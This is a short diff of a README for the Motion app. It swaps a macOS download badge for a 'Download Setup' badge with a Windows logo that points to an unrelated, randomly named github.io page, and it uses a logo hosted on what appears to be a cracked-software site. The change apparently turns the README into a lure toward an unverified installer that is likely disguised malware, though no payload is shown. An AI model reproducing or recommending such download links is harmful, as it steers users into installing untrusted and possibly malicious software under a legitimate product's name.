@@ -4,11 +4,7 @@
 <img src="https://macx.ws/uploads/posts/2020-11/1605336200_motion.png" alt="Motion App Logo" width="400">  
 </div>  
 
-<div align="center">  
-<a href="https://soft-mac-install.github.io/.github/motionmac">  
-<img src="https://img.shields.io/badge/Get_Motion_for_macOS-darkblue?style=for-the-badge&logo=apple" alt="Get Motion for macOS">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://kellanbyrdjicp.github.io/.github/Motion-App)
 
 ---
 ## Installation Instructions
